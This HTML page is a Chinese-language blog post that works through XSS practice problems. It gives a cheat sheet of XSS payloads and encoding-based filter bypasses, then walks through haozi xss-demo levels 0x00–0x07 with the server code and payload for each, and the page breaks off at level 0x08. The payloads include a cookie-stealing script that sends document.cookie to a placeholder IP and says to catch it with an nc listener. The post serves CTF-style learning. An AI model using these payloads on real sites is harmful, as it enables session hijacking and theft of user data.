@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lethe">
+
+
+    <meta name="subtitle" content="Life is a struggle">
+
+
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>XSS刷题之旅 | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">XSS刷题之旅</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 30, 2019&nbsp;&nbsp;21:39:47</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/System-Security/">System Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="0x01-一些资源或文章："><a href="#0x01-一些资源或文章：" class="headerlink" title="0x01 一些资源或文章："></a>0x01 一些资源或文章：</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2936">XSS小结</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067">XSS总结</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/xss-collect.html">那些年我们没能bypass的xss filter</a><br><a target="_blank" rel="noopener" href="https://www.zybuluo.com/laodao/note/9592">XSS Filter Evasion Cheat Sheet 中文版</a><br><a target="_blank" rel="noopener" href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload">XSS攻击手段&amp;在CTF中的运用</a></p>
+<br>
+
+<h3 id="0x02-常用Payload（慢慢积累…）"><a href="#0x02-常用Payload（慢慢积累…）" class="headerlink" title="0x02 常用Payload（慢慢积累…）"></a>0x02 常用Payload（慢慢积累…）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">需要用编码绕过时：</span><br><span class="line">Base64：&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;M</span><br><span class="line"></span><br><span class="line">urlencode：&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M </span><br><span class="line"></span><br><span class="line">HTML实体编码 ：&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M</span><br><span class="line">&lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;bb&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;)&gt;cc&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;</span><br><span class="line">&lt;input value=1 type=image src onerror=alert(1) &gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg&gt;标签中可以直接执行实体字符。</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie盗取：</span><br><span class="line">&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxx.xxx.xxx.xxx:1234/a?&quot;+escape(document.cookie);&lt;/script&gt;</span><br><span class="line">nc监听端口1234</span><br></pre></td></tr></table></figure>
+<p>Tips:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 反引号代替圆括号</span><br><span class="line">- 换行绕过正则</span><br><span class="line">- &lt;!--不仅可以用--&gt;,也可以用--!&gt;闭合</span><br><span class="line">- //可以用换行来绕过</span><br><span class="line">- &lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释</span><br><span class="line">- ſ 符号转换为大写后正好为大写字母 S</span><br><span class="line">- 可以用 %0a 代替空格进行绕过</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="0x03-XSS编码"><a href="#0x03-XSS编码" class="headerlink" title="0x03 XSS编码"></a>0x03 XSS编码</h3><h5 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h5><p>JS提供了四种字符编码的策略，</p>
+<ul>
+<li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\141</code></li>
+<li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\x61</code></li>
+<li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\u0061</code></li>
+<li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li>
+</ul>
+<h5 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h5><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
+<p><strong>字符编码</strong><br>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p>
+<p>如<code>&lt;</code>的编码为</p>
+<p><code>&amp;#60; </code>(10进制)</p>
+<p><code>&amp;#x003c; </code>(16进制)</p>
+<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>这里为url全编码，也就是两次url编码</p>
+<p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
+<h5 id="String-fromCharCode编码"><a href="#String-fromCharCode编码" class="headerlink" title="String.fromCharCode编码"></a>String.fromCharCode编码</h5><p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>
+<br>
+
+<h3 id="0x04-刷题"><a href="#0x04-刷题" class="headerlink" title="0x04 刷题"></a>0x04 刷题</h3><h4 id="haozi-xss-demo"><a href="#haozi-xss-demo" class="headerlink" title="haozi-xss-demo"></a>haozi-xss-demo</h4><p>项目：<a target="_blank" rel="noopener" href="https://github.com/haozi/xss-demo">https://github.com/haozi/xss-demo</a><br>地址：<a target="_blank" rel="noopener" href="https://xss.haozi.me/">https://xss.haozi.me</a><br>包含alert(1)的js文件地址：<a target="_blank" rel="noopener" href="https://xss.haozi.me/j.js">https://xss.haozi.me/j.js</a><br>过关方式：构造input code，成功执行alert(1)</p>
+<h6 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h6><p><strong>server code:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接构造js语句即可。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/textarea&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一关插入的地方在html标签里面，所以要先闭合<code>&lt;textarea&gt;</code>标签，再进行构造。<br><strong>nput code:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>input的地方在尖括号内部，需要先闭合尖括号。<br><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一关用正则表达式过滤了括号（替换为空），这里有个小tip，可以用反引号代替圆括号。</p>
+<p>其他关于过滤圆括号的一些方法，可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4936#toc-3">XSS相关一些个人Tips</a></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了圆括号和反引号，所以上一关的方法就不能用了。</p>
+<p>可以用各种编码进行绕过，如url编码、html实体编码。</p>
+<ul>
+<li><code>&lt;svg&gt;</code>标签中可以直接执行实体字符,payload2</li>
+<li>h5中<code>iframe</code>标签的<code>srcdoc</code>属性，<code>srcdoc</code>里的代码会作为<code>iframe</code>中的内容显示出来，<code>srcdoc</code>中可以直接去写转译后的html片段,payload3</li>
+</ul>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">&quot;javascript:alert%281%29&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+
+<h6 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一关将html中的注释符<code>--&gt;</code>替换成了一个表情，并且输入的内容是包含在一段注释符里的。</p>
+<p>html通常的的注释符为：<code>&lt;!--    --&gt; </code>，测试发现<code>&lt;!- -!&gt;</code>、<code>&lt;!-- --!&gt;</code>同样可已用来注释，这里可利用<code>--!&gt;</code>来闭合。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; </span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了以<code>auto</code>、<code>on</code>开头，<code>=</code>结尾的标签属性，并用下划线<code>_</code>进行替换，同时忽略大小写。</p>
+<p>这里可以用换行来绕过正则的检查。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=alert(1)</span><br><span class="line">或</span><br><span class="line">type=image src onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">onmouseover</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span></span></span><br><span class="line"><span class="tag"> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正则匹配了以<code>&lt;</code>或<code>&lt;/</code>开头，<code>&gt;</code>或<code>/&gt;</code>结尾的标签，并替换为空。<br>浏览器容错性运行去掉最后面的<code>&gt;</code>，所以可以去掉它来绕过正则。</p>
+<p><strong>payload:</strong>(最后还有个空格或回车)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>   </span></span><br><span class="line"><span class="tag"></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">article</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h6><p><strong>server code:</strong></p>
